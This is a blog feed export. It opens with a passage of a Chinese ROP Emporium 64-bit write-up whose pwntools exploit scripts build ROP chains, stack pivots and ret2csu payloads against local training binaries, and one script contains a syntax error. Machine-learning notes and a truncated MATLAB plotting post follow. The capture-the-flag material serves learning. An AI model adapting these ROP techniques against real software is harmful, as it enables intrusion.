<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="variable">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="variable">p</span> = <span class="function"><span class="title">process</span>(<span class="string">&quot;./callme&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">one</span> = <span class="number">0</span><span class="variable">x400720</span></span><br><span class="line"><span class="variable">two</span> = <span class="number">0</span><span class="variable">x400740</span></span><br><span class="line"><span class="variable">three</span> = <span class="number">0</span><span class="variable">x4006f0</span></span><br><span class="line"><span class="variable">ret</span> = <span class="number">0</span><span class="variable">x40093c</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> = <span class="variable">b</span><span class="string">&#x27;A&#x27;</span> *<span class="number">40</span> + <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">one</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">two</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">three</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">p.sendline</span>(<span class="variable">payload</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">p.interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="write4">4.write4</h2>
<p>用ida分析给出来的几个文件，发现libc中的print_file函数是个可以打印文件内容的函数，那这题就是用栈溢出，跳转到print_file函数去获取到flag。因此，主要是利用两个gadget来实现写字符串到data段。<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214104036505.png"
alt="image-20250214104036505" /><img
src="ROP%20Emporium（64）%20WP.assets/image-20250214104227536.png"
alt="image-20250214104227536" /></p>
<p>得到pop_r14_r15 = 0x400690</p>
<figure>
<img src="ROP%20Emporium（64）%20WP.assets/image-20250214104448963.png"
alt="image-20250214104448963" />
<figcaption aria-hidden="true">image-20250214104448963</figcaption>
</figure>
<p>得到mov_r14_r15 = 0x400628</p>
<p>ida下拉找到data段地址<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214104743879.png"
alt="image-20250214104743879" />构造exp</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="variable">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="variable">p</span> = <span class="function"><span class="title">process</span>(<span class="string">&quot;./write4&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">bss</span> = <span class="number">0</span><span class="variable">x601038</span></span><br><span class="line"><span class="variable">mov_r14_r15</span> = <span class="number">0</span><span class="variable">x400628</span></span><br><span class="line"><span class="variable">pop_r14_r15</span> = <span class="number">0</span><span class="variable">x400690</span></span><br><span class="line"><span class="variable">print_file</span> = <span class="number">0</span><span class="variable">x400510</span></span><br><span class="line"><span class="variable">data</span> = <span class="number">0</span><span class="variable">x601028</span></span><br><span class="line"><span class="variable">pop_rdi</span> = <span class="number">0</span><span class="variable">x400693</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> = <span class="variable">b</span><span class="string">&#x27;a&#x27;</span>* <span class="number">40</span> + <span class="function"><span class="title">p64</span>(<span class="variable">pop_r14_r15</span>)+<span class="title">p64</span>(<span class="variable">bss</span>+<span class="string">&quot;flag.txt&quot;</span>+<span class="title">p64</span>(<span class="variable">mov_r14_r15</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">pop_rdi</span>) + <span class="title">p64</span>(<span class="variable">bss</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">print_file</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">p.sendline</span>(<span class="variable">payload</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">p.interactive</span>() </span><br></pre></td></tr></table></figure>
<h2 id="badchars">5.badchars</h2>
<p>与上一题基本一致，不过pwnme函数中添加了一个检查，不允许出现x，a，g，.</p>
<figure>
<img src="ROP%20Emporium（64）%20WP.assets/image-20250214110834422.png"
alt="image-20250214110834422" />
<figcaption aria-hidden="true">image-20250214110834422</figcaption>
</figure>
<p>仍旧有提供print_file的链接，可以调用这个函数。</p>
<p><img
src="ROP%20Emporium（64）%20WP.assets/image-20250214110642874.png"
alt="image-20250214110642874" /><img
src="ROP%20Emporium（64）%20WP.assets/image-20250214110815887.png"
alt="image-20250214110815887" />然后我们发现usefulfunction底下还有个usefulgadgets，可以让我们进行异或操作<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214111659502.png"
alt="image-20250214111659502" /></p>
<p>那么思路就是对flag.txt字符串进行异或，绕过限制，然后调整r14和r15指针，去逐个异或，然后跳转到print_file</p>
<p>exp</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./badchars&#x27;)</span><br><span class="line"></span><br><span class="line">xor_r14r15 = 0x400628</span><br><span class="line">add_r14r15 = 0x40062c</span><br><span class="line">sub_r14r15 = 0x400630</span><br><span class="line">mov_r12r13 = 0x400634</span><br><span class="line">pop_r12r13r14r15 = 0x40069c</span><br><span class="line">pop_r14r15 = 0x4006a0</span><br><span class="line">pop_rdi = 0x4006a3</span><br><span class="line">write_addr = 0x601030</span><br><span class="line"></span><br><span class="line">badchars = &#x27;xag.&#x27;</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * 40</span><br><span class="line">payload += p64(pop_r12r13r14r15) + b&#x27;flbh/tyt&#x27; + p64(write_addr) + p64(1) + p64(write_addr + 2)		</span><br><span class="line">payload += p64(mov_r12r13)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 3)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 4)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 6)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[&#x27;print_file&#x27;])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="fluff">6.fluff</h2>
<p>这题和上题唯一的区别就是给的gadget不同，变成了questionableGadgets，底下三个没见过的指令<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214112129447.png"
alt="image-20250214112129447" />查一下</p>
<p>xlat指令：将[rbx+al]的值赋值给al</p>
<p>stosb指令：将al赋值给[rdi]</p>
<p>bextr：位域索引，第一个源操作数是原数据，第二个源操作数是索引开始位置（8位）和长度，这里可以控制rbx的值</p>
<p>然后再找到这两个gadget</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00000000004006a3</span> : <span class="keyword">pop</span> <span class="built_in">rdi</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000000400639</span> : <span class="keyword">stosb</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span> <span class="comment">; ret</span></span><br></pre></td></tr></table></figure>
<p>能够将寄存器的值赋值到内存中的只有stosb指令，我们有pop rdi;
ret的gadget，因此可以控制stosb指令将al的值写到哪里。而xlat可以将内存中的一个值写入al。但首先，我们需要控制rbx的值，这样才能够在内存中寻找正确的字节。而对于rbx，我们又可以使用bextr指令，控制rcx和rdx后，我们可以在rbx中写入任意值。这样就可以通过修改rbx
来修改al。</p>
<p>exp</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">xlat</span> = <span class="number">0x400628</span></span><br><span class="line"><span class="keyword">bextr</span> = <span class="number">0x40062A</span></span><br><span class="line"><span class="keyword">stosb</span> = <span class="number">0x400639</span></span><br><span class="line">zero_seg = <span class="number">0x600fa0</span>			</span><br><span class="line">write_addr = <span class="number">0x601038</span></span><br><span class="line"><span class="built_in">rdi</span> = <span class="number">0x4006A3</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line">char_addr = [<span class="number">0x4003C4</span>, <span class="number">0x4003C1</span>, <span class="number">0x4003D6</span>, <span class="number">0x4003CF</span>, <span class="number">0x4003C9</span>, <span class="number">0x4003D8</span>, <span class="number">0x400246</span>, <span class="number">0x4003D8</span>]</span><br><span class="line">char = [ord(x) for x <span class="keyword">in</span> <span class="string">&#x27;flag.txt&#x27;</span>]</span><br><span class="line">print(char)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(<span class="built_in">rdi</span>) + p64(write_addr)			</span><br><span class="line">payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(zero_seg - <span class="number">0x3EF2</span> - <span class="number">0xb</span>)		</span><br><span class="line">payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(char_addr[<span class="number">0</span>] - <span class="number">0x3EF2</span>)</span><br><span class="line">payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">payload += p64(<span class="keyword">stosb</span>)</span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(char_addr[i + <span class="number">1</span>] - char[i] - <span class="number">0x3EF2</span>)	</span><br><span class="line">	payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">	payload += p64(<span class="keyword">stosb</span>)</span><br><span class="line">payload += p64(<span class="built_in">rdi</span>) + p64(write_addr)</span><br><span class="line">payload += p64(elf<span class="number">.</span>plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="pivot">7.pivot</h2>
<p>是一道栈迁移的题目</p>
<p>找到经典usefulgadgets<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214113945044.png"
alt="image-20250214113945044" /></p>
<p>通过mov rax,
[rax]我们能够控制rax的值，就可以将任意地址的值写入到rax中</p>
<p>上面的uselessfunction还提供了提供了_foothold_function函数，在so库中查看<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214114742265.png"
alt="image-20250214114742265" />发现没什么用，但是可以用于延迟绑定后提供该so库的地址泄露</p>
<p>后门函数同上是ret2win</p>
<p>所以思路就是覆盖rbp，跳转到leave
ret完成迁移，执行_foothold_function函数，打印got表，泄露地址，拿到ret2win的地址，返回pwnme，调用ret2win</p>
<p>exp</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pivot&#x27;)</span><br><span class="line">lib = ELF(&#x27;./libpivot.so&#x27;)</span><br><span class="line"></span><br><span class="line">rax = 0x4009bb</span><br><span class="line">rsp = 0x4009bd</span><br><span class="line">rax_addr = 0x4009c0</span><br><span class="line">add_rax = 0x4009c4</span><br><span class="line">jmp_rax = 0x4007c1</span><br><span class="line">main_addr = 0x400847</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;place to pivot: 0x&#x27;)</span><br><span class="line">stack = int(p.recv(12).decode(), 16)</span><br><span class="line">payload = p64(elf.plt[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax) + p64(elf.got[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax_addr)		</span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(jmp_rax)</span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line">payload = b&#x27;a&#x27;*32	</span><br><span class="line">payload += p64(lib.symbols[&#x27;ret2win&#x27;] - lib.symbols[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax) + p64(stack)	</span><br><span class="line">payload += p64(rsp)						</span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ret2csu">8.ret2csu</h2>
<p>仍旧有后门函数ret2win<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214132031877.png"
alt="image-20250214132031877" />只要三个参数符合要求即可</p>
<p>在这个片段我们可以控制一系列寄存器的值<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214132401399.png"
alt="image-20250214132401399" />再用ROPgadgets查找<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214132609643.png"
alt="image-20250214132609643" /></p>
<p>发现pop rdi; ret实际上是将原来的pop r15指令拆掉了，上面的pop rsi,
ret也一样</p>
<p>第三个函数参数在rdx中保存，但我们没办法rdx，这就用到第二个片段了<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214133130717.png"
alt="image-20250214133130717" />但是对edi的赋值出现了一点问题，mov edi,
r13d只赋值四个字节，高4字节赋值不了，而我们找到一个片段</p>
<p>它将rsp减8又加8<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214141115280.png"
alt="image-20250214141115280" />我们试试看，但还需要在内存空间中找到一个保存着这个代码段地址的地方，因为call的地址是取值拿到的，所以不能直接将地址放在寄存器中。我们在IDA中尝试搜索，还真有</p>
<figure>
<img src="ROP%20Emporium（64）%20WP.assets/image-20250214134158024.png"
alt="image-20250214134158024" />
<figcaption aria-hidden="true">image-20250214134158024</figcaption>
</figure>
<p>这里rbp和rbx都是之前控制的，我们需要让这个跳转不成立，就需要rbx+1==rbp的值</p>
<p>完成之后，再rsp+8，pop6个值之后就是下一个返回地址，这样就可以跳过call直接返回,来修改rdi的值，从这里去修改rdi为目标值，然后跳转去win函数即可。<img
src="ROP%20Emporium（64）%20WP.assets/image-20250214144108583.png"
alt="image-20250214144108583" /></p>
<p>exp</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span> = process(&#x27;./ret2csu&#x27;)</span><br><span class="line"><span class="attribute">lib</span> = ELF(&#x27;./libret2csu.so&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">ROP_1</span> = <span class="number">0</span>x40069a</span><br><span class="line"><span class="attribute">ROP_2</span> = <span class="number">0</span>x400680</span><br><span class="line"><span class="attribute">rdi</span> = <span class="number">0</span>x4006a3</span><br><span class="line"><span class="attribute">call</span> = <span class="number">0</span>x400689</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span> = b&#x27;a&#x27;*<span class="number">40</span></span><br><span class="line"><span class="attribute">payload</span> += p64(rdi) + p64(<span class="number">0</span>xdeadbeefdeadbeef)</span><br><span class="line"><span class="attribute">payload</span> += p64(ROP_1)</span><br><span class="line"><span class="attribute">payload</span> += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>x4003B0) + p64(<span class="number">0</span>xdeadbeefdeadbeef) + p64(<span class="number">0</span>xcafebabecafebabe) + p64(<span class="number">0</span>xd00df00dd00df00d)</span><br><span class="line"><span class="attribute">payload</span> += p64(ROP_2)</span><br><span class="line"><span class="attribute">payload</span> += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"><span class="attribute">payload</span> += p64(rdi) + p64(<span class="number">0</span>xdeadbeefdeadbeef) </span><br><span class="line"><span class="attribute">payload</span> += p64(elf.plt[&#x27;ret2win&#x27;])</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>cs231n学习笔记</title>
    <url>/2025/09/02/cs231n%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>CS231n的学习笔记</p>
<p>开个新坑监督一下自己并形成一下学习笔记</p>
<p>三个大作业和课程我的期望是在15-20天内完成，然后抽空复习一下动手学习深度模型（如果有时间的话，我会形成笔记的）</p>
<p>还是先做cs231n的学习笔记吧</p>
<p>趁着学期初发力一下，假期深感自己的懈怠</p>
<p>前期会多学一些后期随着难度增加适当放缓，课程笔记不会太多，但是课程作业我会写的详细一点</p>
<h1 id="day125.9.2">DAY1（25.9.2）</h1>
<h2 id="c1.卷积神经网络简介">C1.卷积神经网络简介</h2>
<p>所以很明显，CV是宇宙的中心（笑）</p>
<p>1.对于难以处理的图像，我们可以进行适当的分割，我们不知道像素组合起来是人，但我们可以提取所有疑似人的像素（用<strong>图论解决图像分割</strong>问题）</p>
<p>2.<strong>SIFT</strong>（尺度不变特征转换）通过匹配关键点而非匹配整体来进行检测，具有很好的鲁棒性</p>
<p>3.图像特征的维度一般很高,因此算法很容易<strong>过拟合</strong>（按照我现在学习的内容应该是提前停止训练或者增加数据量可以解决一些）</p>
<p>4.<strong>ImageNet</strong>是一个很大的目标识别数据集,相关比赛往往使用top5标准来衡量</p>
<p>第一课的知识密度并不高，因为主要都是在介绍CV和CS231n的课程安排，不过讲的非常有趣且娓娓道来</p>
<h2 id="c2.图像分类">C2.图像分类</h2>
<p>1.我们会采用<strong>数据驱动算法</strong>：不具体写出识别每个物体对应的规则，而是<strong>针对每一类物体，找到大量样例图片，灌给计算机进行机器学习，归纳模式规律，生成一个分类器模型，总结出区分不同类物体的核心知识要素，然后用训练好的模型，识别新的图像</strong>。</p>
<p>2.最邻近算法 <span> <span
class="math display"><em>d</em><sub>1</sub>(<em>I</em><sub>1</sub>, <em>I</em><sub>2</sub>) = ∑<sub><em>p</em></sub>|<em>I</em><sub>1</sub><sup><em>p</em></sup> − <em>I</em><sub>2</sub><sup><em>p</em></sup>|</span>
<span></p>
<ul>
<li>其中 <img src="https://www.zhihu.com/equation?tex=p" alt="公式" />
为像素点，<img src="https://www.zhihu.com/equation?tex=I%5Ep"
alt="公式" /> 表示第 <img src="https://www.zhihu.com/equation?tex=p"
alt="公式" /> 个像素点的值。</li>
<li>两张图片使用 L1
距离来进行比较，即逐个像素求差值，然后将所有差值加起来得到一个数值。如果两张图片一模一样，那么
L1 距离为 0；但是如果两张图片很是不同，那 L1 值将会非常大。</li>
</ul>
<p>代码实现如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NearestNeighbor</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">train</span>(<span class="params">self, X, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; X 是 NxD 维的数组，每一行都是一个样本，比如一张图片，D 是样本的数据维度；</span></span><br><span class="line"><span class="string">    Y 是长度为 N 的一维数组。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 最邻近分类器只是简单的记住所有的训练数据</span></span><br><span class="line">    <span class="variable language_">self</span>.Xtr = X</span><br><span class="line">    <span class="variable language_">self</span>.ytr = y</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, X</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; X 是 NxD 维的数组，每一行都是一个希望预测其标签的样本 &quot;&quot;&quot;</span></span><br><span class="line">    num_test = X.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 确保输出的标签数据类型和输入的标签格式一致，长度是测试样本数</span></span><br><span class="line">    Ypred = np.zeros(num_test, dtype = <span class="variable language_">self</span>.ytr.dtype)</span><br><span class="line">    <span class="comment"># 循环所有测试样本数，即测试数组的行数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_test):</span><br><span class="line">      <span class="comment"># 为第 i 张测试图片找到最接近的训练图片</span></span><br><span class="line">      <span class="comment"># 使用 L1 距离 (差值的绝对值求和)</span></span><br><span class="line">      <span class="string">&#x27;&#x27;&#x27;self.Xtr - X[i,:] 利用传播机制，求测试集第 i 张图片对应的行向量和</span></span><br><span class="line"><span class="string">      训练集所有图片行向量的差值，得到一个一个50000x3072的差值矩阵；</span></span><br><span class="line"><span class="string">      abs(self.Xtr - X[i,:] )会将矩阵所有元素求绝对值；</span></span><br><span class="line"><span class="string">      然后axis = 1 会对差值矩阵按行求和，最终得到一个长度为50000的一维</span></span><br><span class="line"><span class="string">      数组，存放第 i 张图片和训练集所有50000张图片的 L1 距离。&#x27;&#x27;&#x27;</span></span><br><span class="line">      distances = np.<span class="built_in">sum</span>(np.<span class="built_in">abs</span>(<span class="variable language_">self</span>.Xtr - X[i,:]), axis = <span class="number">1</span>)</span><br><span class="line">      min_index = np.argmin(distances) <span class="comment"># 获取距离最小的训练集图片索引</span></span><br><span class="line">      Ypred[i] = <span class="variable language_">self</span>.ytr[min_index] <span class="comment"># 预测第 i 张测试集图片的标签时与其最接近的训练集图片索引</span></span><br><span class="line">    <span class="keyword">return</span> Ypred</span><br></pre></td></tr></table></figure>
<p>如果用L2距离</p>
<p>只需要改动</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">distances = np.sqrt(np.<span class="built_in">sum</span>(np.square(<span class="variable language_">self</span>.Xtr - X[i,:]), axis = <span class="number">1</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;np.square(self.Xtr - X[i,:]) 会对差值矩阵的每一个元素求平方&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在 L1 距离更依赖于坐标轴的选定，坐标轴选择不同 L1
距离也会跟着变化，判定的数据归类的边界会更趋向于贴近坐标系的轴来分割所属区域，而
L2
的话相对来说与坐标系的关联度没那么大，会形成一个圆，不跟随坐标轴变化。在面对两个向量之间的差异时，L2
比 L1 更加不能容忍这些差异。也就是说，<strong>相对于1个巨大的差异，L2
距离更倾向于接受多个中等程度的差异（因为会把差值平方）</strong></p>
<p>3.k最近邻分类器</p>
<p><strong>Nearest Neighbor
分类器</strong>。<strong>KNN的思想是：找最相似的 <img
src="https://www.zhihu.com/equation?tex=k" alt="公式" />
个图片的标签，<img src="https://www.zhihu.com/equation?tex=k"
alt="公式" /> 中数量最多的标签作为对测试图片的预测</strong>。</p>
<p>超参数（hyperparameter）是需要提前设置的，设置完成后模型才可以训练学习，具体的设置方法通常要借助于实验，尝试不同的值，根据效果表现进行选择。（无法通过训练得到，需要预先设置）</p>
<p>设置验证集</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 假设 Xtr_rows, Ytr, Xte_rows, Yte 还是和之前一样</span></span><br><span class="line"><span class="comment"># Xtr_rows 是 50,000 x 3072 的矩阵</span></span><br><span class="line">Xval_rows = Xtr_rows[:1000, :] <span class="comment"># 取前 1000 个训练集样本作为验证集</span></span><br><span class="line">Yval = Ytr[:1000]</span><br><span class="line">Xtr_rows = Xtr_rows[1000:, :] <span class="comment"># 剩下的 49,000 个作为训练集</span></span><br><span class="line">Ytr = Ytr[1000:]</span><br><span class="line"><span class="comment"># 找出在验证集表现最好的超参数 k </span></span><br><span class="line">validation_accuracies = []</span><br><span class="line">for k in [1, 3, 5, 10, 20, 50, 100]:</span><br><span class="line">  <span class="comment"># 使用一个明确的 k 值评估验证集</span></span><br><span class="line">  nn = NearestNeighbor()</span><br><span class="line">  nn.train(Xtr_rows, Ytr)</span><br><span class="line">  <span class="comment"># 这里假设一个修正过的 NearestNeighbor 类，可以把 k 值作为参数输入</span></span><br><span class="line">  Yval_predict = nn.predict(Xval_rows, k = k)</span><br><span class="line">  acc = np.mean(Yval_predict == Yval)</span><br><span class="line">  print &#x27;accuracy: %f&#x27; % (acc,)</span><br><span class="line">  <span class="comment"># 把每个 k 值和相应的准确率保存起来</span></span><br><span class="line">  validation_accuracies.append((k, acc))</span><br></pre></td></tr></table></figure>
<p>交叉验证</p>
<p>即将数据集分组，随机去掉部分组，循环利用</p>
<p>4.KNN分类器优点</p>
<p>易于理解，实现简单。
算法的训练不需要花时间，因为其训练过程只是将训练集数据存储起来</p>
<p>5.KNN分类器缺点</p>
<p>测试要花费大量时间</p>
<p>因为每个测试图像需要和所有存储的训练图像进行比较在实际应用中，关注测试效率远远高于训练效率；</p>
<p>6.参数模型往往会在训练完成后得到一组参数，之后就可以完全扔掉训练数据，预测的时候只需和这组参数做某种运算，即可根据运算结果做出判断。线性分类器是参数模型里最简单的一种，但却是神经网络里很重要的基础模块。</p>
<p>线性分类的方法由两部分组成：</p>
<p><strong>① 评分函数（score function）</strong></p>
<ul>
<li>它是原始图像数据到类别分值的映射。</li>
</ul>
<p><strong>② 损失函数（loss function）</strong></p>
<ul>
<li>它用来量化评分函数计算的分数与真实标签之间的一致性。该方法可转化为一个最优化问题，在最优化过程中，通过更新评分函数的参数来最小化损失函数值。</li>
</ul>
<p><span
class="math display"><em>f</em>(<em>x</em><sub><em>i</em></sub>, <em>W</em>, <em>b</em>) = <em>W</em><em>x</em><sub><em>i</em></sub> + <em>b</em></span></p>
<ul>
<li>上式中参数 <img src="https://www.zhihu.com/equation?tex=W"
alt="公式" /> 被称为<strong>权重</strong>，<img
src="https://www.zhihu.com/equation?tex=b" alt="公式" />
被称为<strong>偏置项</strong></li>
<li>在上面的公式中，假设每个图像数据都被拉长为一个长度为 <img
src="https://www.zhihu.com/equation?tex=D" alt="公式" />
的列向量，大小为 <img
src="https://www.zhihu.com/equation?tex=%5BD%20%5Ctimes%201%5D"
alt="公式" />。其中大小为 <img
src="https://www.zhihu.com/equation?tex=%5BK%20%5Ctimes%20D%5D"
alt="公式" /> 的矩阵 <img src="https://www.zhihu.com/equation?tex=W"
alt="公式" /> 和大小为 <img
src="https://www.zhihu.com/equation?tex=%5BK%20%5Ctimes%201%5D"
alt="公式" /> 的列向量 <img src="https://www.zhihu.com/equation?tex=b"
alt="公式" /> 为该函数的<strong>参数（parameters）</strong>。</li>
</ul>
<p>一个简单的例子</p>
<p><img src="https://p.sda1.dev/26/4f6f80c89fb1e02bc23d31806185ab1d/2025-09-02 195650.png" style="zoom:80%;" /></p>
]]></content>
  </entry>
  <entry>
    <title>MATLAB配色以及常用绘图</title>
    <url>/2025/02/21/MATLAB%E9%85%8D%E8%89%B2%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%98%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="三维柱状图">1.三维柱状图</h1>
<p><code>\#8ECFC9 #FFBE7A #FA7F6F #82B0D2 #BEB8DC #E7DAD2</code></p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 颜色转换</span></span><br><span class="line">colorHex = &#123;<span class="string">&#x27;8ECFC9&#x27;</span>,<span class="string">&#x27;FFBE7A&#x27;</span>,<span class="string">&#x27;FA7F6F&#x27;</span>,<span class="string">&#x27;82B0D2&#x27;</span>,<span class="string">&#x27;BEB8DC&#x27;</span>,<span class="string">&#x27;E7DAD2&#x27;</span>&#125;;</span><br><span class="line">colorRGB = <span class="built_in">zeros</span>(<span class="built_in">length</span>(colorHex),<span class="number">3</span>);</span><br><span class="line"><span class="keyword">for</span> k = <span class="number">1</span>:<span class="built_in">length</span>(colorHex)</span><br><span class="line">    colorRGB(k,:) = sscanf(colorHex&#123;k&#125;,<span class="string">&#x27;%2x%2x%2x&#x27;</span>)/<span class="number">255</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 生成数据</span></span><br><span class="line">data = <span class="number">10</span>*<span class="built_in">rand</span>(<span class="number">5</span>,<span class="number">6</span>)+<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 创建图形</span></span><br><span class="line"><span class="built_in">figure</span>(<span class="string">&#x27;Color&#x27;</span>,[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>], <span class="string">&#x27;Position&#x27;</span>,[<span class="number">200</span> <span class="number">200</span> <span class="number">800</span> <span class="number">500</span>])</span><br><span class="line">h = bar3(data);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 平面化样式设置</span></span><br><span class="line"><span class="keyword">for</span> s = 